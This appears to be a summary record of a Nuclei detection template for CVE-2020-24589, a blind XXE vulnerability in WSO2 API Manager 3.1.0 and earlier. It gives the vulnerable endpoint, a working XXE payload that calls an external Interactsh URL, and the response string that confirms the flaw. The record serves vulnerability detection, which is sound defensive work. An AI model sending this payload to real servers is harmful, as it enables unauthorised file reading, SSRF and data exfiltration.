---
cve_id: CVE-2020-24589
template_path: nuclei-templates/http/cves/2020/CVE-2020-24589.yaml
affected_product: WSO2 API Manager
severity: critical
authentication: none
external_callback: true
affected_versions: <=3.1.0
preconditions: []
poc_classification: info-leak
---

## Vulnerability

WSO2 API Manager version 3.1.0 and earlier contains a blind XML External Entity (XXE) injection vulnerability (CWE-611). This critical vulnerability allows an unauthenticated attacker to inject malicious XML entities through the `/carbon/generic/save_artifact_ajaxprocessor.jsp` endpoint. XXE vulnerabilities enable attackers to view files on the server file system, interact with backend or external systems accessible to the application, and transmit sensitive data from the compromised server to attacker-controlled systems. The vulnerability has a CVSS v3.1 score of 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H), indicating high confidentiality and availability impact with no privileges required for exploitation.

## PoC / Detection

Classification: info-leak

The template detects this vulnerability by sending a POST request to `/carbon/generic/save_artifact_ajaxprocessor.jsp` with a crafted XML payload containing an external entity definition that references an attacker-controlled URL via Interactsh. The payload uses URL-encoded XML: `<?xml version="1.0" ?><!DOCTYPE a [ <!ENTITY % xxe SYSTEM "http://{{interactsh-url}}">%xxe;]>`. The template verifies the vulnerability by checking for two conditions: (1) an HTTP callback is received at the Interactsh server (confirming out-of-band XXE), and (2) the response body contains the string "Failed to install the generic artifact type", indicating the endpoint processed the malicious XML. This blind XXE detection confirms the server parses external entities and can be exploited to exfiltrate data or perform SSRF attacks.

## References

- https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742
- https://nvd.nist.gov/vuln/detail/CVE-2020-24589
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/athiththan11/WSO2-CVE-Extractor
